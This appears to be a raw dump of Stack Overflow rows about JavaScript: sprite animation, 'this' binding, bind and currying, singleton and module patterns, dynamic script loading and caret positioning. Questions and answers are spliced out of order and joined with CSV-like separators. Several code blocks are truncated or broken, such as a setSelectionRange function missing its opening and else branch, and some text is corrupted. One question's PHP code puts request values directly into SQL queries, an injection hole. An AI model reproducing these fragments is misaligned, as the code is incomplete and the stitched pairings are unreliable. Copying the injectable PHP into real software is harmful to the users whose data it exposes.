<p>I will use a simple div element, with the <code>width</code> and <code>height</code> that the animated image will have, the png sprite as <code>background-image</code>  and <code>background-repeat</code> set to <code>no-repeat</code></p>

<p><strong>CSS Needed:</strong></p>

<pre><code>#anim {
  width: 14px; height: 14px;
  background-image: url(http://mail.google.com/mail/im/emotisprites/wink2.png);
  background-repeat: no-repeat; 
}
</code></pre>

<p><strong>Markup needed:</strong></p>

<pre><code>&lt;div id=""anim""&gt;&lt;/div&gt;
</code></pre>

<p>The trick is basically to scroll the background image sprite up, using the <code>background-position</code> CSS property.</p>

<p>We need to know the <code>height</code> of the animated image (to know how much we will scroll up each time) and how many times to scroll (how many <em>frames</em> will have the animation).</p>

<p><strong>JavaScript implementation:</strong></p>

<pre><code>var scrollUp = (function () {
  var timerId; // stored timer in case you want to use clearInterval later

  return function (height, times, element) {
    var i = 0; // a simple counter
    timerId = setInterval(function () {
      if (i &gt; times) // if the last frame is reached, set counter to zero
        i = 0;
      element.style.backgroundPosition = ""0px -"" + i * height + 'px'; //scroll up
      i++;
    }, 100); // every 100 milliseconds
  };
})();

// start animation:
scrollUp(14, 42, document.getElementById('anim'))
</code></pre>

<p><strong>EDIT:</strong> You can also set the CSS properties programmatically so you don't have to define any style on your page, and make a <a href=""https://developer.mozilla.org/En/Core%5FJavaScript%5F1.5%5FGuide/Creating%5FNew%5FObjects/Using%5Fa%5FConstructor%5FFunction"">constructor function</a> from the above example, that will allow you to show multiple sprite animations simultaneously:</p>

<p><strong>Usage:</strong></p>

<pre><code>var wink = new SpriteAnim({
  width: 14,
  height: 14,
  frames: 42,
  sprite: ""http://mail.google.com/mail/im/emotisprites/wink2.png"",
  elementId : ""anim1""
});

var monkey = new SpriteAnim({
  width: 18,
  height: 14,
  frames: 90,
  sprite: ""http://mail.google.com/mail/im/emotisprites/monkey1.png"",
  elementId : ""anim4""
});
</code></pre>

<p><strong>Implementation:</strong></p>

<pre><code>function SpriteAnim (options) {
  var timerId, i = 0,
      element = document.getElementById(options.elementId);

  element.style.width = options.width + ""px"";
  element.style.height = options.height + ""px"";
  element.style.backgroundRepeat = ""no-repeat"";
  element.style.backgroundImage = ""url("" + options.sprite + "")"";

  timerId = setInterval(function () {
    if (i &gt;= options.frames) {
      i = 0;
    }
    element.style.backgroundPosition = ""0px -"" + i * options.height + ""px"";
     i++;
  }, 100);

  this.stopAnimation = function () {
    clearInterval(timerId);
  };
}
</code></pre>

<p>Notice that I added a <code>stopAnimation</code> method, so you can later stop a an specified animation just by calling it, for example:</p>

","5445","","<p>Usually you can use the <code>this</code> keyword on event handlers since it will be a reference to the element that triggered the event and other jQuery functions like <code>$.each</code>.</p>

<p>For example when handling a click event lets say:</p>

<pre><code>$('.parentElement').click(function () {
  $('.foo', this).hide();
});
</code></pre>

<p>The above code, will hide all the elements with class <code>foo</code> that are descendants of the currently <code>parentElement</code> that was clicked.</p>

<p>The use of the context argument of the jQuery function is the equivalent of making a call to the <code>find</code> method:</p>

<pre><code>$(expr, context);
// is just equivalent to:
$(content).find(expr);
</code></pre>

<p><strong>EDIT:</strong> Looking at your example:</p>

<pre><code>    $(""#clickme"").click(function() {
      $(""span"",this);//... (1)
      $(""span"");//..       (2)
    });
</code></pre>

<p>The first line, will look for all the <code>span</code> elements that are <strong>inside</strong> of <code>#clickme</code> (its <em>descendants</em>), since that element was the one that triggered the <code>click</code> event.</p>

<p>The second line, will look for <strong>all</strong> the <code>span</code> elements on the whole page.</p>

}
</code></pre>

<p>I'm told it's because <code>this</code> changes without it, but I don't understand why <code>this</code> changes, why the wrap function prevents it from changing, and what <code>this</code> would change to without the wrap function.</p>
","5445","","<p>You need to wrap them because when a function is used as an event handler, the <code>this</code> keyword refers to the DOM element that triggered the event, and if you don't wrap it, you don't have access to the instance members of your <code>Dragger</code> object, like <code>this.isMouseDown</code>.</p>

<p>For example:</p>

<p>Let's say you have a button:</p>

<pre><code>&lt;input type=""button"" id=""buttonId"" value=""Click me"" /&gt;
</code></pre>

<p>And you have the following object:</p>

<pre><code>var obj = {
  value: 'I am an object member',
  method: function () {
    alert(this.value);
  }
}
</code></pre>

<p>If you call:</p>

<pre><code>obj.method();
</code></pre>

<p>You will see an alert with the text contained in the <code>value</code> member of the <code>obj</code> object (<em>'I am an object member'</em>).</p>

<p>If you use the <code>obj.method</code> function as an event handler:</p>

<pre><code>document.getElementById('buttonId').onclick = obj.method;
</code></pre>

<p>When the user clicks the button, it will alert <em>'Click me'</em>.</p>

<p>Why?
Because when the click event is fired, <code>obj.method</code> will be executed with the <code>this</code> keyword pointing to the DOM element, and it will alert <em>'Click me'</em> because the button contains a <code>value</code> member.</p>

<p>You can check the above snippets running <a href=""http://jsbin.com/epixi"" rel=""nofollow"">here</a>.</p>

<p><hr></p>

<p>For context enforcement, I always keep close a <a href=""http://www.prototypejs.org/api/function/bind"" rel=""nofollow"">bind</a> function:</p>

<pre><code>// The .bind method from Prototype.js
if (!Function.prototype.bind) {
  Function.prototype.bind = function(){
    var fn = this, args = Array.prototype.slice.call(arguments),
             object = args.shift();
    return function(){
      return fn.apply(object,
        args.concat(Array.prototype.slice.call(arguments)));
    };
  };
}
</code></pre>

<p>It allows you to wrap any function, enforcing the context. As the first argument, it receives the object that will be used as <code>this</code>, and the rest of optional arguments, are the ones the wrapped functionenter code here will be called with.</p>

<p>In the button example we could use it as :</p>

<pre><code>document.getElementById('buttonId').onclick = obj.method.bind(obj);
</code></pre>

<p>It's really helpful in a lot of situations and it will be introduced as part of ECMAScript 5.</p>

"<p>This is a follow-up question to a different question I asked not too long ago. Typically, you can access an event in a function call from a jQuery event like this:</p>

<p>and in the function:</p>

<pre><code>function functionToCall(ev) {
  // do something with ev here, like check 'ev.target'

<p>But what if I wanted to send a parameter to functionToCall() <em>and</em> access the event? So something like this, maybe? :</p>

<p><strong>CLARIFICATION:</strong> I realize that an anonymous callback function would allow me to access both, but for various reasons too lengthy to get into in this post, I need to use a function call rather than the anonymous function. So my question deals strictly with the scenario when an external function needs to be called. Thanks.</p>

<p><strong>UPDATE:</strong> My original question presented the scenario of needing to pass $(this) as a parameter to the external function. As it turns out, $(this) will be accessible in the function without even needing to pass it, because of the way jQuery reassigns values to ""this"" based on events. So performing this code should work for my original question:</p>

<pre><code>$item.live(""click"", functionToCall);
</code></pre>

<p>and</p>

<pre><code>function functionToCall(ev) {
  alert(ev.type);
  alert($(this).attr('id'));  // display id of item that was clicked
}
</code></pre>

<p>However, as others have answered, there is a different scenario that involves needing to pass a different kind of variable over as a parameter, such as a simply string or int. In this case, as others have notes, it becomes more complicated. But there do seem to be sufficient answers here to satisfy this second scenario (namely, ""currying""). Thanks.</p>
","5445","","<p>You can <a href=""http://en.wikipedia.org/wiki/Currying""><em>curry</em></a> or partially apply your function:</p>

And I want to change back the reload.gif animation to the reload.png static image, right the same time when the new captcha image has been load image. The problem is that the captcha image is being generated by GD library of PHP, and I don’t know how much time that will take to create a new image. 
Please help me to be able to synchronize.  May be there is a good approach for doing this kind of things… </p>

","5445","","<p>You can use the <code>onload</code> event on the image, to know exactly when your new captcha image has been loaded on the browser, I added IDs to your markup:</p>

"<p>I'm working on some out transitions on image when a user presses the button to move to the next image.

I wanted to create a little delay between the animation of each image in the array so I'm trying to run my jQuery.animate after a 1 second timeout. </p>

    	setTimeout(tempTransition, 100);

    } else {
    	set[i].transitionOut( $('#gallery'), 562 );

<p>transitionOut():</p>

"<p>I'm relatively new to JS and I'm having issues properly emulating OOP principles. </p>

<p>I guess I have two questions. Question the first is regarding the many ways to declare variables.</p>

<p>Say I have a class:</p>

<pre><code>function clazz(a)
{
    this.b = 2;
    var c = 3;
    this.prototype.d = 4; // or clazz.prototype.d = 4?
}

var myClazz = new clazz(1);
</code></pre>

<p>Am I correct in the following assessments:</p>

<p>a is a private variable that is instance specific (i.e. different instances of clazz will have unique and independent variables 'a'). It can be accessed from within clazz as: 'a'.</p>

<p>b is a public variable that is instance specific. It can be accessed from within clazz as 'this.b' and from outside clazz as 'myClazz.b'.</p>

<p>c is a private variable that is static, or class specific (i.e. different instances of clazz will share the same 'c' variable). It can be accessed from within any instance of clazz as 'c' and changes in instance of clazz are reflected in all instances of clazz.</p>

<p>d is a public variable that is static/class specific. It can be accessed from anywhere via 'clazz.prototype.d' or 'myClazz.prototype.d'.</p>

<p>The overall issue I have with my understanding of the variable scheme is that there's no way to declare a private variable that is NOT static (i.e. a unique version for every instance of the class).</p>

<p>The second question is with respect to different types of class declarations.</p>

<p>I've been using:</p>

<pre><code>var MySingleton = new function() {...};
</code></pre>

<p>to create singletons. Is this correct? I'm also unsure as to the effect of the ""new"" keyword in this situation as well as appending () function braces to the end of the declaration as so:</p>

<pre><code>var MySingleton = new function() {...}();
</code></pre>

<p>I've been using this pattern to declare a class and then instantiate instances of that class:</p>

<pre><code>function myClass() {...};
var classA = new myClass();
var classB = new myClass();
</code></pre>

<p>Is this the proper method?</p>
","5445","","<p>You are right for <code>a</code> and <code>b</code>:</p>

<p><code>a</code> is an argument, available only within the scope of the <a href=""https://developer.mozilla.org/En/Core%5FJavaScript%5F1.5%5FGuide/Creating%5FNew%5FObjects/Using%5Fa%5FConstructor%5FFunction"">constructor function</a>.</p>

<p><code>b</code>is a public instance variable, available on all instances created with that constructor function.</p>

<p><code>c</code> is a private variable, accessible only within the constructor function.</p>

<p>The <code>d</code> declaration is invalid, because the <code>prototype</code> object is meant to be used only on <a href=""https://developer.mozilla.org/En/Core%5FJavaScript%5F1.5%5FGuide/Creating%5FNew%5FObjects/Using%5Fa%5FConstructor%5FFunction"">constructor functions</a>, like <code>Clazz.prototype.d = 3;</code>, if you do it like this, the variable will be shared, but you can assign a value on an specific instance, and the default value will be <em>shadowed</em> (through the prototype chain).</p>

<p>For ""private variables"" you can use the way you declare <code>c</code>, for example:</p>

<pre><code>function Clazz(){
    var c = 3; // private variable

    this.privilegedMethod = function () {
      alert(c);
    };
}
</code></pre>

<p>Privileged methods, are public, but they can access ""private"" variables declared inside the constructor function.</p>

<p>For creating singletons, the easiest way is maybe to use an object literal, like:</p>

<pre><code>var myInstance = {
  method1: function () {
    // ...
  },
  method2: function () {
    // ...
  }
};
</code></pre>

<p>And if you want private members on your singleton instance, you can:</p>

<pre><code>var myInstance = (function() {
  var privateVar = '';

  function privateMethod () {
    // ...
  }

  return { // public interface
    publicMethod1: function () {
      // all private members are accesible here
    },
    publicMethod2: function () {
    }
  };
})();
</code></pre>

<p>This is has been called the module pattern, it basically allows you to encapsulate private members on an object, by taking advantage of the use of <a href=""http://jibbering.com/faq/faq%5Fnotes/closures.html"">closures</a>.</p>

</ul>

<p><strong>Edit:</strong> About the syntax you post:</p>

<pre><code>var mySingleton = new (function() {
  // ...
})();
</code></pre>

<p>By using the <code>new</code> operator, you are declaring and using in <em>one step</em> an ""<em>anonymous constructor function</em>"", which will generate a new object instance, it is valid but I personally would prefer the ""module"" pattern approach, to create my own object instance (and avoid <code>new</code>). </p>

<p>Also, reading <code>new function () {}</code>, I think that is not really intuitive and may create confusion, if you don't understand well how the <code>new</code> operator works.</p>

<p>About the parentheses, they are optional, the <code>new</code> operator will call the function constructor without parameters if you don't add them (<em>see <a href=""http://www.ecma-international.org/publications/files/ECMA-ST/ECMA-262.pdf"">ECMA-262</a>, 11.2.2</em>).</p>

","5445","","<p>No, they aren't the same.</p>

<p>Those values are stored in the <code>args</code> variable of the outer closure of <code>bind</code>, then as you see in the <code>bind</code> implementation, another function is returned.</p>

<p>That function returned in my example is <code>fx2</code> after the assignment, in the last line you see I call that function, passing two additionally arguments.</p>

<p>Finally the returned function will call <code>obj.fx</code> with the two argument lists, the arguments we pre-filled when calling <code>bind</code> (<code>1</code>,<code>2</code>,<code>3</code>) and the arguments when the function actually executed (<code>4</code>,<code>5</code>).</p>

"<p>I have a constructor with these methods:</p>

<pre>    
function getMouseXY(event){
        var x = event.clientX - this.offsetLeft;
        var y = event.clientY - this.offsetTop;
    return [x,y];
}

function alertx(){
    var c = this.getMouseXY(event);
    alert(c[0]);
}
</pre>

<p>In the HTML code i assign the alertx function to a HTML5 canvas' event mouseup:</p>

<pre>
document.getElementById('cbackground').addEventListener('mouseup', object.alertx, false);
</pre>

<p>What's the expected result? That clicking on the canvas it shows the X position of the mouse, instead i get nothing. Further exploration with Firebug gets me the error ""event is not defined"". I don't know how to avoid that! Any tips? Thanks!</p>
","5445","","<p>Let's see a couple of issues:</p>

<ol>
<li>The <code>alertx()</code> doesn't receive an <code>event</code> argument.</li>
<li>In that function you are calling <code>getMouseXY</code> using <code>this</code>. The this keywords at that moment, will refer to the element that triggered the event.</li>
<li>You are binding the event handler to an unknown <code>object</code> variable.</li>
</ol>

<p></p>

<p>I think you want to do something like this:</p>

<pre><code>function getMouseXY(event){
        var x = event.clientX - this.offsetLeft, // notice, 'this' is used
            y = event.clientY - this.offsetTop;

    return [x,y];
}

function alertx(event){
    var c = getMouseXY.call(this, event); // set the element as 'this'
    alert(c[0]);
}
</code></pre>

<p>And if you have a constructor function, and the above functions are instance methods, you can do something like this:</p>

<pre><code>function MyObject () {  // constructor
}

MyObject.prototype.getMouseXY = function (event) {
        var x = event.clientX - this.offsetLeft,
            y = event.clientY - this.offsetTop;

    return [x,y];
};

MyObject.prototype.alertx = function (event, element) {
    var c = this.getMouseXY.call(element, event); 
    alert(c[0]);
}
</code></pre>

<p>When binding the event, you can add an anonymous function, to enforce the context:</p>

<pre><code>var object = new MyObject();
document.getElementById('cbackground').addEventListener('mouseup', function (e) {
  object.alertx(e, this); // alertx will be called with the correct 'this'
}, false);
</code></pre>

<p><hr></p>

<p><strong>Edit:</strong>  In response to your comment, you just have to know how the context (the <code>this</code> keyword) is set <strong>implicitly</strong>:</p>

<p>When you call a instance method like:</p>

<pre><code>obj.method();
</code></pre>

<p>The <code>this</code> keyword inside the <code>method</code>, will refer to <code>obj</code>.</p>

<p>The same thing happens when you call global variables, since they are members of the global object (<code>window</code> in browser scripting):</p>

<pre><code>globalFunction();
</code></pre>

<p>Is equivalent to:</p>

<pre><code>window.globalFunction();
</code></pre>

<p>And the context inside that function will be the global object itself (<code>window</code>).</p>

<p>Another case happens when you use the <code>new</code> operator:</p>

<pre><code>var instance = new MyConstructor();
</code></pre>

<p>The <code>this</code> keyword in that case will be a <em>new object,</em> created by the use of the <code>new</code> operator.</p>

<p>When you use a function as an event handler, the <code>this</code> keyword will refer to the element tha triggered the event:</p>

<pre><code>document.getElementById('myId').onclick = obj.myFunction;
</code></pre>

<p>In that case <code>myFunction</code> is a instance method of <code>obj</code>, but the <code>this</code> keyword will refer to the DOM element that has been clicked.</p>

<p>And finally, as you saw in my code, the context can be set <strong>explicitly</strong> by the use of <a href=""https://developer.mozilla.org/en/Core%5FJavaScript%5F1.5%5FReference/Global%5FObjects/Function/call"" rel=""nofollow""><code>call</code></a> or <a href=""https://developer.mozilla.org/en/Core%5FJavaScript%5F1.5%5FReference/Global%5FObjects/Function/apply"" rel=""nofollow""><code>apply</code></a>.</p>

"<p>I'm having some issues with the ordering of javascript execution in the following page:</p>

<pre><code>&lt;!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.0 Transitional//EN"" ""http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd""&gt;
&lt;html xmlns=""http://www.w3.org/1999/xhtml"" &gt;
&lt;head&gt;

&lt;script type=""text/javascript""&gt;
    var blah = 0;

    function scriptDoneRunning()
    {
    	alert(blah);
    }

    function addExternalScript(src, parentNode)
    {
    	var sc = document.createElement('script');
    	sc.setAttribute('type', 'text/javascript');
    	sc.setAttribute('src', src);
    	parentNode.appendChild(sc);
    }

    function addEndingScript(parentNode)
    {
    	var theDiv = document.createElement('div');
    	var sc = document.createElement('script');
    	sc.setAttribute('type', 'text/javascript');
    	sc.text = ""scriptDoneRunning();"";
    	theDiv.appendChild(sc);
    	parentNode.appendChild(theDiv);
    }
&lt;/script&gt;
&lt;/head&gt;

&lt;body&gt;
&lt;div id=""theparent""&gt;
    &amp;nbsp;
&lt;/div&gt;

&lt;script type=""text/javascript""&gt;
    addExternalScript(""blah.js"", document.getElementById(""theparent""));
    addEndingScript(document.getElementById(""theparent""));
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>

<p>And the blah.js file looks like this....</p>

<pre><code>blah=3;
</code></pre>

<p>Essentially the code calls ""addExternalScript()"" which adds a script element for ""blah.js"" to the ""theparent"" element. ""blah.js"" sets the variable blah to 3.</p>

<p>Then we call ""addEndingScript()"" which appends a script block to ""theparent"". All that script block does is call scriptDoneRunning() which alerts the variable blah.</p>

<p>The idea is that scriptDoneRunning() only gets called AFTER the blah.js has finished executing. Because it is appended to ""theparent"" after the external script element I would expect it to wait for that to complete then it would call scriptDoneRunning(). This is the behavior I expected, however it only works that way in firefox. In IE the value alerted is 0, which means the code in blah.js has not executed yet.</p>

<p>This is a slimmed down version of what the page actually does so obviously this doesn't make a ton of sense. But is there a way to append the inline script in such a way that the code in blah.js always executes first in both browsers?</p>

<p>Also, when this is deployed I will not have control over the external js. So keep that in mind ;)</p>

<p>Thanks!</p>
","5445","","<p>The script loads asynchronously, you can know exactly when the external script has been loaded,using the <code>load</code> (and <code>readystatechange</code> for IE) events, but you should take care of removing the <code>script</code> elements and nullify the handlers after the load is done to avoid known <a href=""http://ajaxian.com/archives/dynamic-script-generation-and-memory-leaks"" rel=""nofollow"">memory leaks</a>.</p>

<p>I would also recommend you to insert your <code>script</code> elements on the head, there is no really  a reason (unless you use <code>document.write</code> which I don't think is a good idea nowdays) to add the script elements anywhere inside the <code>body</code>...</p>

<p>I use the following library independent function, inspired by the jQuery's $.getScript method:</p>

<pre><code>loadScript(""blah.js"", function () {
  addEndingScript(document.getElementById(""theparent""));
  // or why not simply scriptDoneRunning(); ???
});

function loadScript(url, callback) {
  var head = document.getElementsByTagName(""head"")[0],
      script = document.createElement(""script""),
      done = false;

  script.src = url;

  // Attach event handlers for all browsers
  script.onload = script.onreadystatechange = function(){
    if ( !done &amp;&amp; (!this.readyState ||
      this.readyState == ""loaded"" || this.readyState == ""complete"") ) {
      done = true;
      callback(); // execute callback function

      // Prevent memory leaks in IE
      script.onload = script.onreadystatechange = null;
      head.removeChild( script );
    }

"<p>I just read a few threads on the discussion of singleton design in javascript. I'm 100% new to the Design Pattern stuff but as I see since a Singleton by definition won't have the need to be instantiated, conceptually if it's not to be instantiated, in my opinion it doesn't have to be treated like conventional objects which are created from a blueprint(classes). So my wonder is why not just think of a singleton just as something statically available that is wrapped in some sort of scope and that should be all.</p>

<p>From the threads I saw, most of them make a singleton though traditional javascript </p>

<pre><code>new function(){}
</code></pre>

<p>followed by making a pseudo constructor.</p>

<p>Well I just think an object literal is enough enough:</p>

<pre><code>var singleton = {
   dothis: function(){},
   dothat: function(){}
}
</code></pre>

<p>right? Or anybody got better insights? </p>

<p>[update] : Again my point is why don't people just use a simpler way to make singletons in javascript as I showed in the second snippet, if there's an absolute reason please tell me. I'm usually afraid of this kind of situation that I simplify things to much :D</p>
","5445","","<p>I agree with you, the simplest way is to use a object literal, but if you want <em>private</em> members, you could implement taking advantage of <a href=""http://www.jibbering.com/faq/faq%5Fnotes/closures.html"">closures</a>:</p>

<pre><code>var myInstance = (function() {
  var privateVar;

  function privateMethod () {
    // ...
  }

  return { // public interface
    publicMethod1: function () {
      // private members can be accessed here
    },
    publicMethod2: function () {
      // ...
    }
  };
})();
</code></pre>

<p>About the <code>new function(){}</code> construct, it will simply use an anonymous function as a <a href=""https://developer.mozilla.org/En/Core%5FJavaScript%5F1.5%5FGuide/Creating%5FNew%5FObjects/Using%5Fa%5FConstructor%5FFunction""><code>constructor function</code></a>, the context inside that function will be a new object that will be returned.</p>

<p><strong>Edit:</strong> In response to the <a href=""http://stackoverflow.com/questions/1895635/javascript-singleton-question#comment-1799557"">@J5's comment</a>, that is simple to do, actually I think that this can be a nice example for using a <em>Lazy Function Definition</em> pattern:</p>

<pre><code>function singleton() {
  var instance = (function() {
    var privateVar;

    function privateMethod () {
      // ...
    }

    return { // public interface
      publicMethod1: function () {
          // private members can be accessed here
       },
      publicMethod2: function () {
        // ...
      }
    };
  })();

  singleton = function () { // re-define the function for subsequent calls
    return instance;
  };

  return singleton(); // call the new function
}
</code></pre>

<p>When the function is called the first time, I make the object instance, and reassign <code>singleton</code> to a new function which has that object instance in it's closure.</p>

<p>Before the end of the first time call I execute the re-defined <code>singleton</code> function that will return the created instance.</p>

<p>Following calls to the <code>singleton</code> function will simply return the <code>instance</code> that is stored in it's closure, because the new function is the one that will be executed.</p>

<p>You can prove that by comparing the object returned:</p>

<pre><code>singleton() == singleton(); // true
</code></pre>

<p>The <code>==</code> operator for objects will return <code>true</code> only if the object <em>reference</em> of both operands is the same, it will return false even if the objects are identical but they are two different instances:</p>

<pre><code>({}) == ({}); // false
new Object() == new Object(); // false

","5445","","<p>The only issue I see as far, is that you are actually exposing two globals, <code>window.Console</code> that is fine, since you want to expose it there, and <code>$c</code>.</p>

<p>If you don't use it, <code>$c</code> will be global.</p>

<p>The pattern you posted, consists simply on augmenting objects, and the prototype chain is not used at all.</p>

<p>Thank You</p>
","5445","","<p>I think is a good case to use <a href=""http://docs.jquery.com/Traversing/map"">Traversing/map</a>:</p>

<pre><code>var values = $(""span[dir='somevalue']"").map(function(){
  return $(this).text();
}).get();
</code></pre>

<p>The <code>values</code> variable is now an <code>Array</code> that contains on each array element the inner text of each <code>span</code> matched by your selector.</p>

<p>If you want to concatenate all the values in a string, you can use <a href=""https://developer.mozilla.org/En/Core%5FJavaScript%5F1.5%5FReference/Objects/Array/Join""><code>Array.prototype.join</code></a>:</p>

<pre><code>var allValues = values.join("" ""); // using a space as separator between values
</code></pre>
"
"<p>Can you pass key-value pairs to a JavaScript file like that:</p>

<pre><code>&lt;script type=""text/javascript"" src=""http://www.example.com/script.js?key=value""&gt;&lt;/script&gt;
</code></pre>
","5445","","<p>That technique is used by <a href=""http://wiki.github.com/madrobby/scriptaculous"" rel=""nofollow"">scriptaculous</a> (see <a href=""http://github.com/madrobby/scriptaculous/blob/master/src/scriptaculous.js#L54"" rel=""nofollow"">line 54</a>):</p>

<pre><code>&lt;script type=""text/javascript"" src=""scriptaculous.js?load=effects,dragdrop""&gt;
&lt;/script&gt;
</code></pre>

<p>You can achieve this by inspecting the source of the <code>script</code> elements on your page, I leave you a framework independent function:</p>

<pre><code>function getScriptVariable(scriptName, key) {
  var scripts = document.getElementsByTagName('script'),
      n = scripts.length, scriptSource, i, r;

  for (i = 0; i &lt; n; i++) {
    scriptSource = scripts[i].src;
    if(scriptSource.indexOf(scriptName)&gt;=0) {
      r = new RegExp(""[\\?&amp;]""+key+""=([^&amp;#]*)"");
      var keyValues = r.exec(scriptSource);
      return keyValues[1];
    }
  }
}
</code></pre>

<p>Then you can embed a script in the way you want:</p>

<pre><code>&lt;script type=""text/javascript"" src=""myScript.js?myKey=myValue""&gt;
&lt;/script&gt;
</code></pre>

<p>And use the above function in this way:</p>

<pre><code>var value = getScriptVariable('myScript.js', 'myKey'); // ""myValue""
</code></pre>

"<p>I am trying (and failing) to implement a drag&amp;drop mechanism into an HTML textarea. </p>

<p>Drag&amp;Drop mechanism is relatively easy with jQuery or Scriptaculous (we use both), so I am willing to accept an answer that uses either of these two.</p>

<p>Problem is, I cannot seem to find a way to read or set the insertion point. </p>

<p>What I ultimately want to be able to do is determine the drop location, do some kind of mathematical calculation to determine where on the textarea that is exactly, then set the caret position (or insertion point), and place (insert) dropped text there.</p>

","5445","","<p>Since you mention you're using jQuery, I would recommend you to give a look to the <a href=""http://laboratorium.0xab.cd/jquery/fieldselection/0.1.0/test.html"" rel=""nofollow"">FieldSelection</a> plugin. That plugin will help you to get information about where the cursor is currently placed.</p>

<p>For setting the cursor position, I use the following functions:</p>

  if (input.setSelectionRange) {
    input.focus();
    input.setSelectionRange(selectionStart, selectionEnd);

    range.collapse(true);
    range.moveEnd('character', selectionEnd);
    range.moveStart('character', selectionStart);
    range.select();
  }
}

function setCaretToPos (input, pos) {
  setSelectionRange(input, pos, pos);
}

<p>The you can use the <code>setCaretToPos</code> function like this:</p>

<pre><code>setCaretToPos(document.getElementById(""textareaId""), 4);

"<p>I've built a working page with lots of javascript. The javascript is placed in between the <code>&lt;head&gt;&lt;/head&gt;</code> tags without a problem, but I really want to move it an external file.</p>

Can anyone suggest why I can't just do this?</p>

<p>As a compromise, I though I would detach at least some of my functions and put them in an external file but there are problems there too. </p>

","5445","","<p>When you call a function with no context specified, as you are calling <code>look()</code>, the <code>this</code> keyword inside that function will be the global object.</p>

<p>In your case you could only pass a reference to your function, and it will work properly:</p>

<pre><code>$(""input"").focus(look);
</code></pre>

<p>Also, it might be helpful to know that the <code>this</code> keyword is not completely implicit, can be set explicitly by using the <a href=""https://developer.mozilla.org/en/Core%5FJavaScript%5F1.5%5FReference/Objects/Function/call"" rel=""nofollow""><code>call</code></a> and <a href=""https://developer.mozilla.org/en/Core%5FJavaScript%5F1.5%5FReference/Objects/Function/apply"" rel=""nofollow""><code>apply</code></a> functions:</p>

  alert(this + arg1);
}

test.call('hello ', 'world'); // will alert 'hello world'

<p>And that the context (the <code>this</code> keyword) is set implicitly in the following cases:</p>

<p>1- When calling a function that is member of an object, eg.:</p>

<pre><code>obj.myFunc(); // 'this' will refer to obj
</code></pre>

<p>2- When calling a function with the <code>new</code> operator:</p>

<pre><code>var test = new Func(); // 'this' will refer to a new object

"<p>Hi I'm using CakePHP and I'm wondering do you guys puts isset() or !empty() around all of your variables in the views? Or should I depend on the data validation? What would be the suggested solution?</p>
","5445","","<p>I think you should know the differences between <code>isset</code> and <code>empty</code> and use the one that fulfills your needs.</p>

};

func.apply(null, arr);

<p>Notice that <code>null</code> is used as the first argument of apply, that will set the <code>this</code> keyword to the Global object (window) inside <code>func</code>.</p>

<p>Also note that the <a href=""https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions_and_function_scope/arguments""><code>arguments</code></a> object is not really an Array, you can convert it by :</p>

<p>And maybe is useful to you, that you can know how many arguments a function expects:</p>

<pre><code>var test = function (one, two, three) {}; 
test.length == 3;

"<p>Ok, first off, I applogize if this question has been asked before, I've spent the last 12 hours sifting through hundreds of forum threads and haven't found one that answers this question exactly yet so here goes.</p>

<p>I have a page that I built that has a userlist that is autopopulated as users log in, and each users has a checkbox that allows the host to select users and removed them if needed.  I am using jQuery to send an array string to a php page where I am attempting to explode the string, walk through the userids and remove the passed ids from our database.  It all works exceedingly well, unless I select more than one user.  When I select more than one user and pass the array to the php handler, it explodes the array but only keeps the last value in the array, the rest of it is lost somewhere in the blackhole of scripting.  </p>

<p>Here is my code from my javascript page:</p>

<pre><code>function rem_user() {  
var ids = $('input:checkbox[id=del]:checked').map(function(){
    return this.value
}).get();
alert(ids);
jQuery(""#rem_msg"").load(controlpage, {AdmFnc: ""rem_user"", del_ids: ids}, getUsers);
}
</code></pre>

<p>this array is then passed to the php controlling page where it is handled by:</p>

<pre><code>if (strcmp($AdmFnc, rem_user) == 0){
echo """";
$ids = trim($_POST['del_ids']);
$ids = explode(',',$ids);
if(is_array($ids)){
   foreach($ids as $userid){
      mysqli_query($dbc, ""UPDATE webcastlogin SET logoutTime = '$current_time' WHERE userid = '$userid'"") or die('Error setting logout time '.mysqli_error($dbc));
      mysqli_query($dbc, ""DELETE FROM weekly_users WHERE userid = '$userid'"") or die('Error removing users '.mysqli_error($dbc));
    }
    echo 'Selected IDs removed';
} else if (empty($ids)) {
    echo 'Code is wrong, no array sent';
} else {
    mysqli_query($dbc, ""UPDATE webcastlogin SET logoutTime = '$current_time' WHERE userid = '$ids'"");
    mysqli_query($dbc, ""DELETE FROM weekly_users WHERE userid = '$ids'"");
    echo 'Selected ID removed';
}
}
</code></pre>

<p>As you can see on my javascript, i have an alert set up so i can verify that the information being sent is correct, as far as i can tell from that alert, it's a <code>"",""</code> delimited array so that's what i'm using on the php side to explode it.</p>

<p>I am at my wits end trying to figure out why when I run this thru the foreach loop i only get the value of the final item in the array.</p>

<p>Any help would be greatly appreciated and may save my hair for some future coding challanges.</p>

<p>My question is relative to what happens at the line marked HERE. Ideally, if I click the first item +, I would expect this code to continue adding just below the first item. This does not happen. It continues incrementing the new_id (as you can see from the alert) instead of keeping the original new_id it was granted. </p>

<p>Now, I have a suspect about what's going on, mostly involving the closure nature of javascript, but I want to hear it explained from someone more skilled.</p>

<p>As a side note, if I partition the logic for binding the event in a separate method, it works as expected... from this my suspect.</p>
","5445","","<p>The problem that is causing this behavior in your code is that you're missing the <a href=""https://developer.mozilla.org/En/Core%5FJavaScript%5F1.5%5FReference/Statements/Var"" rel=""nofollow""><code>var</code></a> statement when you assign a value to <code>new_id</code>.</p>

<p>In JavaScript when you make an assignment to an undeclared identifier (an identifier not reachable in the scope chain), it becomes global (<code>window.new_id</code> is created) and that's why it keeps incrementing.</p>

"<p>Firstly apologies for the title, I don't know if it describes what I am trying to achieve but its the best I've got.</p>

<p>Basically I have an array describing the intensity over a 2D space. I want to then distribute this intensity to neighbors over a given set of iterations, i.e. Lets say I have the following array:</p>

<pre><code>intensity = [ 0, 0, 0, 0, 0, 
              0, 0, 0, 0, 0, 
              0, 0, 0, 0, 0, 
              0, 0, 100, 0, 0, 
              0, 0, 0, 0, 0, 
              0, 0, 0, 0, 0,
              0, 0, 0, 0, 0 ]
</code></pre>

<p>I then do one pass over my distributeIntensity algorithm (distributing 50% of intensity to neighbours).  I then would have:</p>

<pre><code>            [ 0,  0,   0,  0, 0, 
              0,  0,   0,  0, 0, 
              0, 50,  50, 50, 0, 
              0, 50, 100, 50, 0, 
              0, 50,  50, 50, 0, 
              0,  0,   0,  0, 0,
              0,  0,   0,  0, 0 ]
</code></pre>

